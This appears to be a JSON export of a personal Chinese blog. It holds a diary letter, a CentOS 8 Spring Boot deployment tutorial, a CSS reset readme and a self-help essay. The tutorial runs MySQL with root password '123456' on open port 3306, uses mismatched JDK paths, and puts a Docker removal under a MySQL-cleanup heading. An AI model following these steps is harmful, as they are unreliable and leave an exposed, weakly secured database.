往，车来车往，发呆。一度，我觉得特别痛苦。这条路，走到这个时候，再走下去，还是更深的深渊和黑暗，而且没有人可以同行。你在吗？哈哈。有时候我可以感觉到你，可是我自己很糟糕的时候，我什么也感觉不到。可是除了搞清楚这一切，除了继续走下去，我更没有什么其他有兴趣的事了。走着走着，就把自己活成了一个异类。我不在意，我很享受跟别人不一样。我只是还没有足够的能量，去更快的转变。我也不知道我在等什么。可能还是要持续的去做一些事，不能由着自己，训练只要机械化的执行就可以，而积累到一定程度，自然会发生变化。而想要什么的念头，是不是也需要不断的去强化呢。\n晚上看到笑笑发的广告，关于扁平水晶的，一眼就看中了，很有感觉，就入手了两个。我想这也是你给的启示吧。\n这是一场没有终止的游戏，过了一关，能力提升了一些，就会解锁新的关卡。而对于不断的挑战，不断的解锁新关卡，升起这样的兴趣也需要能量。我知道，只是在这个过程中，只是现在这种不上不下的阶段，会比较痛苦。\n我不想说了，你有什么想要跟我说的。\n给我打气呀，我知道你会说，你看见我很努力，尽管我口口声声觉得我真的没有什么兴趣，也没有什么欲望，但是我也真的从来没有放弃过去让自己生长进化，去提升自己。少想一点，多做一点。可是我也无法掌控我的念头。好吧，无法控制的时候，我就少做一点，但是我得去做，是不是。不能不做。稳定的时候多做一些，不稳定的时候少做一些，但是我不能停下来不做，我得每天做，哪怕做一点点，每日精进，就会趋于更多的稳定，改变也会发生。好吧，我收到了。我记住了。做。稳定就多做点，不稳定也要做。不要不做。那么升级就只剩下时间的问题，迟早会发生。\n\n我只是在呢喃自语，\n如果你看了，就已经是一种见证和陪伴了，\n因为我知道一定会有人看。\n如果有什么信息能和你共鸣，\n你从中看见了自己，\n那就是另外的收获了。\n如果你看懂了，\n你从中看见了我，\n还能有什么回应，\n并且这回应我们还可以彼此共振，\n那就是更大的惊喜了。\n没有无缘无故的遇见。\n致敬未知。\n","slug":"epistle.2021.9.15.01","date":"2021-09-15T13:44:56.000Z","categories_index":"书信","tags_index":"小柔书信","author_index":"Arvin"},{"id":"2aac3b676b1834f75f50b636fcf98017","title":"Cent OS 8.0服务器部署Spring Boot","content":"Cent OS 8.0服务器部署Spring Boot\n前期准备说明：\n服务器镜像选择CentOs8.0系统镜像(新手建议选择轻量级应用服务器（主机），个人推荐云服务器)\n需要准备好域名\n需要准备好Spring Boot的项目\n准备好JDK安装包(linux系统X64 Bit)\n我们需要准备两个软件用于本地连接服务器\nXshell 7 这个软件用于远程管理服务器（你需要设置好服务器密钥）\nXftp 7 这个软件用于上传下载服务器文件\n\n\n我们需要开放需要的端口\n80 服务器的默认网页端口（建议不要采用默认的）\n8080 自定义TCP协议端口\n22 SSH远程连接端口\n3306 Mysql默认端口等\n\n\n\n\n服务器前期配置：\n\n\n\n\n\n\n\n\n我们需要在Data文件夹下新建三个文件夹\n# tmp文件夹我们用于存放临时文件，如安装包等\nmkdir -p &#x2F;data&#x2F;tmp\n# service文件夹我们用于存放服务器软件文件\nmkdir -p &#x2F;data&#x2F;service\n# file文件夹为存放项目的文件夹，根据项目名称命名\nmkdir -p &#x2F;data&#x2F;file\n\n\n\n\n\n\n\n\n\n\n从oracle官方网站上下载1.8版本中的最新版的JDK。下载完成后，把文件通过XFTP上传到服务器上（tmp文件夹）。接着进行解压和配置环境变量。然后我们需要在服务器中解压（通过Xshell 7连接服务器）\n\n#进入安装包目录\ncd &#x2F;data&#x2F;tmp\n#解压\ntar -zxvf jdk-8u281-linux-x64.tar.gz\n#把解压出来的文件夹转移到service文件夹的地方\nmv &#x2F;data&#x2F;tmp&#x2F;jdk1.8.0_281 &#x2F;data&#x2F;service&#x2F;jdk1.8.0_28\n\n\n\n\n\n\n\n\n\n\n下来我们要进行JDK环境变量的配置(etc文件夹下profile文件)\n# 修改环境变量&#x2F;etc&#x2F;profile\nvim &#x2F;etc&#x2F;profile\n\n\n\n\n\n\n\n\n\n\n通过i键进入编写模式，完成后按ESC文件退出编写模式，输入(:wq)保存并退出（配置内容如下）\nexport JAVA_HOME&#x3D;&#x2F;data&#x2F;service&#x2F;jdk1.8.0_281\nexport PATH&#x3D;$PATH:$JAVA_HOME&#x2F;bin\n\n\n\n\n\n\n\n\n\n\n 最后我们测试JDK\n#使环境变量生效\nsource &#x2F;etc&#x2F;profile\n#检查是否配置成功\njava -version\n\nMySQL安装\n\n\n\n\n\n\n\n\n如果之前安装过Mysql，那么我们需要清理干净之前的MySQL文件\n#卸载旧版本\nsudo yum remove docker \\\n                docker-client \\\n                docker-client-latest \\\n                docker-common \\\n                docker-latest \\\n                docker-latest-logrotate \\\n              docker-logrotate \\\n                docker-engine\n\n\n\n\n\n\n\n\n\n我们采用docker的方式安装mysql\n#安装 Docker Engine-Community\nsudo yum install -y yum-utils device-mapper-persistent-data lvm2\n# -----分割线\nsudo yum-config-manager \\\n  --add-repo \\\n  http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;docker-ce&#x2F;linux&#x2F;centos&#x2F;docker-ce.repo\n# -----分割线\nsudo yum install docker-ce docker-ce-cli containerd.io\n# ----分割线\nsudo systemctl start docker\n\n\n\n\n\n\n\n\n\n如果安装发生错误那么你需要执行一下命令\n\nyum install https:&#x2F;&#x2F;download.docker.com&#x2F;linux&#x2F;fedora&#x2F;30&#x2F;x86_64&#x2F;stable&#x2F;Packages&#x2F;containerd.io-1.2.6-3.3.fc30.x86_64.rpm\n\n\n\n\n\n\n\n\n\n下面我们进行MySQL的安装\n#查看可用的 MySQL 版本\ndocker search mysql\n#拉取8.0.22版本，这里推荐安装和自己项目一致的版本\ndocker pull mysql:8.0.22\n\n\n\n\n\n\n\n\n\n下面我们要对MySQL进行配置\n#创建配置文件目录\nmkdir -p &#x2F;data&#x2F;docker&#x2F;mysql&#x2F;conf\n#进入配置文件目录，添加一个配置文件\nvim my.cnf\n\n\n\n\n\n\n\n\n\n配置文件内容\n[mysqld]\ncharacter-set-server&#x3D;utf8\n\n[mysql]\ndefault-character-set&#x3D;utf8\n\n\n\n\n\n\n\n\n\n完成配置后我们需要启动镜像 (注意记住自己设置的密码)\n#启动镜像\ndocker run -p 3306:3306 --name mysql -v &#x2F;data&#x2F;docker&#x2F;mysql&#x2F;conf:&#x2F;etc&#x2F;mysql&#x2F;conf.d -e MYSQL_ROOT_PASSWORD&#x3D;123456 -d mysql:8.0.22\n#进入docker容器设置env LANG&#x3D;C.UTF-8\ndocker exec -it mysql env LANG&#x3D;C.UTF-8 bash\n\n\n项目部署\n首先我们需要将项目打包（jar包）\n然后我们要设置好MySQL数据表\n然后我们进行服务器部署，首先我们需要查看需要的端口有没有被占用(建议不要使用8080端口)\n\n\nnetstat -anp | grep 8080 \n\n\n\n\n\n\n\n\n\n如果端口被占用了，我们需要获取到它PID值\nsudo lsof -i:8800 \n\n\n\n\n\n\n\n\n\n拿到PID值后，我们需要将它Kill掉，留出空位来运行我们的项目\nsudo kill -9 11356\n\n\n\n\n\n\n\n\n\n最后我们执行代码启动项目（断开连接自动停止），***为你的jar包名\njava -jar ***.jar\n\n\n\n\n\n\n\n\n\n没有问题后我们执行持久运行\nnohup java -jar  ***.jar &amp;\n\n\n\n\n\n\n\n\n\n在后端查看日志\ntail -f nohup.out\n\n\n至此，CentOs 8.0部署SpringBoot项目已经介绍完成了，当然如果还有疑问或者需要我的素材包请联系我\n","slug":"Cent OS 8.0 _ Deployment server","date":"2021-09-11T10:52:52.000Z","categories_index":"程序","tags_index":"教学文档,Java","author_index":"Arvin"},{"id":"a17520357decdc8e59fdc688901503c6","title":"Css初始化Readme文件","content":"Css初始化Readme文件以下提供两种方法，请选择合适自己的，且根据项目实际需求自行修改\n\n方法一：引用Github中necolas的浏览器初始化该方法的目的为：消除不同浏览器对HTML文本呈现的差异.\n代码演示\n&#x2F;* Document\n   &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; *&#x2F;\n \n&#x2F;**\n * 1. Correct the line height in all browsers.\n * 2. Prevent adjustments of font size after orientation changes in iOS.\n *&#x2F;\n \nhtml &#123;\n  line-height: 1.15; &#x2F;* 1 *&#x2F;\n  -webkit-text-size-adjust: 100%; &#x2F;* 2 *&#x2F;\n&#125;\n \n&#x2F;* Sections\n   &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; *&#x2F;\n \n&#x2F;**\n * Remove the margin in all browsers.\n *&#x2F;\n \nbody &#123;\n  margin: 0;\n&#125;\n \n&#x2F;**\n * Render the &#96;main&#96; element consistently in IE.\n *&#x2F;\n \nmain &#123;\n  display: block;\n&#125;\n \n&#x2F;**\n * Correct the font size and margin on &#96;h1&#96; elements within &#96;section&#96; and\n * &#96;article&#96; contexts in Chrome, Firefox, and Safari.\n *&#x2F;\n \nh1 &#123;\n  font-size: 2em;\n  margin: 0.67em 0;\n&#125;\n \n&#x2F;* Grouping content\n   &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; *&#x2F;\n \n&#x2F;**\n * 1. Add the correct box sizing in Firefox.\n * 2. Show the overflow in Edge and IE.\n *&#x2F;\n \nhr &#123;\n  box-sizing: content-box; &#x2F;* 1 *&#x2F;\n  height: 0; &#x2F;* 1 *&#x2F;\n  overflow: visible; &#x2F;* 2 *&#x2F;\n&#125;\n \n&#x2F;**\n * 1. Correct the inheritance and scaling of font size in all browsers.\n * 2. Correct the odd &#96;em&#96; font sizing in all browsers.\n *&#x2F;\n \npre &#123;\n  font-family: monospace, monospace; &#x2F;* 1 *&#x2F;\n  font-size: 1em; &#x2F;* 2 *&#x2F;\n&#125;\n \n&#x2F;* Text-level semantics\n   &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; *&#x2F;\n \n&#x2F;**\n * Remove the gray background on active links in IE 10.\n *&#x2F;\n \na &#123;\n  background-color: transparent;\n&#125;\n \n&#x2F;**\n * 1. Remove the bottom border in Chrome 57-\n * 2. Add the correct text decoration in Chrome, Edge, IE, Opera, and Safari.\n *&#x2F;\n \nabbr[title] &#123;\n  border-bottom: none; &#x2F;* 1 *&#x2F;\n  text-decoration: underline; &#x2F;* 2 *&#x2F;\n  text-decoration: underline dotted; &#x2F;* 2 *&#x2F;\n&#125;\n \n&#x2F;**\n * Add the correct font weight in Chrome, Edge, and Safari.\n *&#x2F;\n \nb,\nstrong &#123;\n  font-weight: bolder;\n&#125;\n \n&#x2F;**\n * 1. Correct the inheritance and scaling of font size in all browsers.\n * 2. Correct the odd &#96;em&#96; font sizing in all browsers.\n *&#x2F;\n \ncode,\nkbd,\nsamp &#123;\n  font-family: monospace, monospace; &#x2F;* 1 *&#x2F;\n  font-size: 1em; &#x2F;* 2 *&#x2F;\n&#125;\n \n&#x2F;**\n * Add the correct font size in all browsers.\n *&#x2F;\n \nsmall &#123;\n  font-size: 80%;\n&#125;\n \n&#x2F;**\n * Prevent &#96;sub&#96; and &#96;sup&#96; elements from affecting the line height in\n * all browsers.\n *&#x2F;\n \nsub,\nsup &#123;\n  font-size: 75%;\n  line-height: 0;\n  position: relative;\n  vertical-align: baseline;\n&#125;\n \nsub &#123;\n  bottom: -0.25em;\n&#125;\n \nsup &#123;\n  top: -0.5em;\n&#125;\n \n&#x2F;* Embedded content\n   &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; *&#x2F;\n \n&#x2F;**\n * Remove the border on images inside links in IE 10.\n *&#x2F;\n \nimg &#123;\n  border-style: none;\n&#125;\n \n&#x2F;* Forms\n   &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; *&#x2F;\n \n&#x2F;**\n * 1. Change the font styles in all browsers.\n * 2. Remove the margin in Firefox and Safari.\n *&#x2F;\n \nbutton,\ninput,\noptgroup,\nselect,\ntextarea &#123;\n  font-family: inherit; &#x2F;* 1 *&#x2F;\n  font-size: 100%; &#x2F;* 1 *&#x2F;\n  line-height: 1.15; &#x2F;* 1 *&#x2F;\n  margin: 0; &#x2F;* 2 *&#x2F;\n&#125;\n \n&#x2F;**\n * Show the overflow in IE.\n * 1. Show the overflow in Edge.\n *&#x2F;\n \nbutton,\ninput &#123; &#x2F;* 1 *&#x2F;\n  overflow: visible;\n&#125;\n \n&#x2F;**\n * Remove the inheritance of text transform in Edge, Firefox, and IE.\n * 1. Remove the inheritance of text transform in Firefox.\n *&#x2F;\n \nbutton,\nselect &#123; &#x2F;* 1 *&#x2F;\n  text-transform: none;\n&#125;\n \n&#x2F;**\n * Correct the inability to style clickable types in iOS and Safari.\n *&#x2F;\n \nbutton,\n[type&#x3D;&quot;button&quot;],\n[type&#x3D;&quot;reset&quot;],\n[type&#x3D;&quot;submit&quot;] &#123;\n  -webkit-appearance: button;\n&#125;\n \n&#x2F;**\n * Remove the inner border and padding in Firefox.\n *&#x2F;\n \nbutton::-moz-focus-inner,\n[type&#x3D;&quot;button&quot;]::-moz-focus-inner,\n[type&#x3D;&quot;reset&quot;]::-moz-focus-inner,\n[type&#x3D;&quot;submit&quot;]::-moz-focus-inner &#123;\n  border-style: none;\n  padding: 0;\n&#125;\n \n&#x2F;**\n * Restore the focus styles unset by the previous rule.\n *&#x2F;\n \nbutton:-moz-focusring,\n[type&#x3D;&quot;button&quot;]:-moz-focusring,\n[type&#x3D;&quot;reset&quot;]:-moz-focusring,\n[type&#x3D;&quot;submit&quot;]:-moz-focusring &#123;\n  outline: 1px dotted ButtonText;\n&#125;\n \n&#x2F;**\n * Correct the padding in Firefox.\n *&#x2F;\n \nfieldset &#123;\n  padding: 0.35em 0.75em 0.625em;\n&#125;\n \n&#x2F;**\n * 1. Correct the text wrapping in Edge and IE.\n * 2. Correct the color inheritance from &#96;fieldset&#96; elements in IE.\n * 3. Remove the padding so developers are not caught out when they zero out\n *    &#96;fieldset&#96; elements in all browsers.\n *&#x2F;\n \nlegend &#123;\n  box-sizing: border-box; &#x2F;* 1 *&#x2F;\n  color: inherit; &#x2F;* 2 *&#x2F;\n  display: table; &#x2F;* 1 *&#x2F;\n  max-width: 100%; &#x2F;* 1 *&#x2F;\n  padding: 0; &#x2F;* 3 *&#x2F;\n  white-space: normal; &#x2F;* 1 *&#x2F;\n&#125;\n \n&#x2F;**\n * Add the correct vertical alignment in Chrome, Firefox, and Opera.\n *&#x2F;\n \nprogress &#123;\n  vertical-align: baseline;\n&#125;\n \n&#x2F;**\n * Remove the default vertical scrollbar in IE 10+.\n *&#x2F;\n \ntextarea &#123;\n  overflow: auto;\n&#125;\n \n&#x2F;**\n * 1. Add the correct box sizing in IE 10.\n * 2. Remove the padding in IE 10.\n *&#x2F;\n \n[type&#x3D;&quot;checkbox&quot;],\n[type&#x3D;&quot;radio&quot;] &#123;\n  box-sizing: border-box; &#x2F;* 1 *&#x2F;\n  padding: 0; &#x2F;* 2 *&#x2F;\n&#125;\n \n&#x2F;**\n * Correct the cursor style of increment and decrement buttons in Chrome.\n *&#x2F;\n \n[type&#x3D;&quot;number&quot;]::-webkit-inner-spin-button,\n[type&#x3D;&quot;number&quot;]::-webkit-outer-spin-button &#123;\n  height: auto;\n&#125;\n \n&#x2F;**\n * 1. Correct the odd appearance in Chrome and Safari.\n * 2. Correct the outline style in Safari.\n *&#x2F;\n \n[type&#x3D;&quot;search&quot;] &#123;\n  -webkit-appearance: textfield; &#x2F;* 1 *&#x2F;\n  outline-offset: -2px; &#x2F;* 2 *&#x2F;\n&#125;\n \n&#x2F;**\n * Remove the inner padding in Chrome and Safari on macOS.\n *&#x2F;\n \n[type&#x3D;&quot;search&quot;]::-webkit-search-decoration &#123;\n  -webkit-appearance: none;\n&#125;\n \n&#x2F;**\n * 1. Correct the inability to style clickable types in iOS and Safari.\n * 2. Change font properties to &#96;inherit&#96; in Safari.\n *&#x2F;\n \n::-webkit-file-upload-button &#123;\n  -webkit-appearance: button; &#x2F;* 1 *&#x2F;\n  font: inherit; &#x2F;* 2 *&#x2F;\n&#125;\n \n&#x2F;* Interactive\n   &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; *&#x2F;\n \n&#x2F;*\n * Add the correct display in Edge, IE 10+, and Firefox.\n *&#x2F;\n \ndetails &#123;\n  display: block;\n&#125;\n \n&#x2F;*\n * Add the correct display in all browsers.\n *&#x2F;\n \nsummary &#123;\n  display: list-item;\n&#125;\n \n&#x2F;* Misc\n   &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; *&#x2F;\n \n&#x2F;**\n * Add the correct display in IE 10+.\n *&#x2F;\n \ntemplate &#123;\n  display: none;\n&#125;\n \n&#x2F;**\n * Add the correct display in IE 10.\n *&#x2F;\n \n[hidden] &#123;\n  display: none;\n&#125;\n\n\n方式二：常用标签的初始化该方法的目的为：一般标签在浏览器中都有默认样式，例如body标签有默认的外边距，ul有默认的小黑点和内边距，前端程序员在写页面的时候会把这些默认的样式都清除掉，让所有标签的外观效果在所有浏览器表现一致，这个步骤就是css的初始化。\n代码演示\nHTML, body, div, h1, h2, h3, h4, h5, h6, ul, ol, dl, li, dt, dd, p, blockquote,\npre, form, fieldset, table, th, td &#123;\n    border:none;\n    font-family:&quot;微软雅黑&quot;,&quot;黑体&quot;,&quot;宋体&quot;;\n    font-size:14px;\n    margin:0px;\n    padding:0px;\n    &#125;\nhtml,body&#123;\n    height: 100%;\n    width: 100%;\n    &#125;\naddress, caption, cite, code, dfn, em, strong, th, var &#123;\n    font-style: normal;\n    font-weight: normal;\n&#125;\na&#123;\n    text-decoration:none;\n&#125;\na:link&#123;\n    color:#fff;\n&#125;\na:visited&#123;\n    color:#fff;\n&#125;\na:hover&#123;\n    color:#fff;\n&#125;\na:active&#123;\n    color:#fff;\n&#125;\ninput::-ms-clear&#123;\n    display:none;\n    &#125;\ninput::-ms-reveal&#123;\n    display:none;\n&#125;\ninput&#123;\n    -webkit-appearance: none;\n    margin: 0;\n    outline: none;\n    padding: 0;\n&#125;\ninput::-webkit-input-placeholder&#123;\n    color: #ccc;\n&#125;\ninput::-ms-input-placeholder&#123;\n    color: #ccc;\n&#125;\ninput::-moz-placeholder&#123;\n    color: #ccc;\n&#125;\ninput[type&#x3D;submit],input[type&#x3D;button]&#123;\n    cursor: pointer;\n&#125;\nbutton[disabled], input[disabled] &#123;\n    cursor: default;\n&#125;\nimg&#123;\n    border:none;\n&#125;\nul,ol,li&#123;\n    list-style-type:none;\n&#125;\n&#x2F;*公共方法*&#x2F;\n.clear&#123;\n    clear: both;\n&#125;\n.clearleft&#123;\n    clear: left;\n&#125;\n.clearright&#123;\n    clear: right;\n&#125;\n.floatleft&#123;\n    float: left;\n&#125;\n.floatright&#123;\n    float: right;\n&#125;\n.cursor&#123;\n    cursor: pointer;\n&#125;\n&#x2F;*背景及色值表*&#x2F;\n.bg000&#123;\n    background: #000;\n&#125;\n.color000&#123;\n    color: #000;\n&#125;\n\n调用实现在项目HTML头文件中声明该文件的地址，注意路径是否正确\n调用代码演示\n&lt;!DOCTYPE html&gt;\n&lt;html lang&#x3D;&quot;EN&quot;&gt;\n    &lt;head&gt;\n        &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;\n        &lt;title&gt;标题&lt;&#x2F;title&gt;\n        &lt;!-- 进行各个浏览器样式的统一 --&gt;\n        &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;.&#x2F;readne.css&quot;&gt;\n    &lt;&#x2F;head&gt;\n&lt;&#x2F;html&gt;","slug":"WEB_Css_readme","date":"2021-09-06T15:55:52.000Z","categories_index":"程序","tags_index":"教学文档,Css","author_index":"Arvin"},{"id":"3c4e03fedd7f52a41b76242506ed0dd2","title":"【無憂樹洞】醒来，然后去活成你真正想要的样子","content":"我今天被一波能量推动，写下这些文字，尽管我并不确定最终的成文会是什么样子，但是我愿意顺应这样的能量流动，愿意如此真实的面对自己，面对你，面对存在。\n醒来，如同艾米丽唱的醒来。\n你也许听过这样的说词，\n有些人活者，却从未活过。\n有些人活着，却已经死去。\n一个人怎样才算醒来？真的有人是沉睡的吗？\n如果你从未思考过人生，你不会醒来。\n当你开始思考人生，你就一定会醒来。\n总会有某个时刻，\n总会在某个时刻，\n你开始认真的思考：\n你是谁，你活着为了什么，生命对于你而言有什么意义，你要如何活着，你要如何存在。。。\n当你开始思考，当你开始这样问自己，或者问苍天，你就会醒来。\n人生对于你，生活对于你，生命对于你，就已经开始不同。\n无论最终，这一生，你是不是可以找到属于自己的答案，都已经开始不同。\n活着，你想要活成什么样子，\n什么是你真正想要的样子？\n就这个问题，从我真的开始问出这个问题，到今年，我探索了七年。\n我不能说，我已经可以有一个非常明确的答案，但是我有了很多越来越清晰的方向、线索，\n也在这个过程中，一点一点在积累内在的力量，\n这些如同种子，被播撒，在合适的时间，它们会发芽生长。\n如果你还不知道，我真心的想要告诉你，我这样天天在捣鼓这个问题的人，都走了那么多年，\n如果你花了更少的时间或者更多的时间，都没关系，都别着急。\n走吧，继续走吧，会知道方向的，也别错失一路的风景。\n且行且珍惜，且行且欣赏。\n我没有办法告诉你，你想要活成的样子是什么样子，\n因为每个人的这条路，是独一无二的，是私人定制。\n但是我可以跟你分享一些我走过的风景，\n以及一些也许可以称之为经验的东西，\n为了我们各自继续的路，与你共勉。\n你要去的地方，没人会真正知道，除了你。\n如果你也不知道，不要急，只要你想，你一定会知道的。\n要始终相信这一点。\n这趟旅程，没有“别人”的标准，没有“别人”的评价，\n如果你还因为别人的标准或者评价，各种动荡，\n那么，你还没有上路，\n你还没有走在通往自己的神圣之地的路上。\n如果任何人的评价和标准，都不在成为影响你，动摇你的因素，\n如果任何人的评价和标准，你都会心一笑，接受生命各种形式的善意，\n然后依然看起来固执己见，\n我想要非常肯定的告诉你，很好，继续。\n当然，更重要的是，你内在，有这样的笃定，：\n你知道，你在哪里了，你知道你要去哪里了，\n此时，你上路了。\n如果你活成了一个另类，\n你发现你越来越孤独，没有什么人可以理解你，\n你发现你的社交圈越来越窄，几乎没有社交，\n你发现你太格格不入了，\n你怀疑自己可能有各种问题，因为太不合群了。\n我想要非常肯定的告诉你，很好，继续。\n优秀和卓越的都不是寻常人，即便你不优秀也不卓越，你还是独特的你。\n成为独特的你，把你的独特性活出来，你怎么会和“大多数”合群。\n而当你开始接受你的独特性，勇敢的展现出来，\n你一定又会遇见更多“独特“的小众。\n在这条路上，你一定会不断的更新你周围的社交关系，\n甚至不断更新各种被教导的”常识“。\n如果你是一个独特的存在，怎么会有任何模板？\n你喜欢的东西，你适合的东西，你的存在，\n都需要你自己不断的了解和确认。\n如果大众的适合你，你就成了大众。\n所以不要害怕自己活成了一个异类。\n我会跟我很多的个案重复这句话：\n你很好，你很独特，所以你一定会遇见不合群的尴尬。\n你很独特，所以你真的可能会成为大众的异类。\n放心，大胆的走下去吧。\n有一天，你会为自己的独特骄傲。\n有一天，你会为自己活出了一个异类而自豪。\n有一天，你会心甘情愿且无比安心的成为一个低调的异类。\n哈哈。。这是真的，你要相信。\n不要在任何关系中慌乱、责备自己不够好。\n回来，回来，回来。\n回到自己和自己的关系。\n这是我们唯一的、全部的功课。\n多花一些时间在自己的身上。\n享受独处的时光。\n如果没有人了解你，就了解自己。\n如果没有人爱你，就爱自己。\n如果没有人照顾你，就照顾自己。\n然后，某天你会发现，\n当你足够了解自己，你就了解了其他人和世界。\n当你真的开始爱自己，你就可以真心的爱周围的人和世界。\n也许你会说，我不知道，要怎么爱自己。\n把你的双手，放在胸口，时不时的问自己：想要什么，想要怎样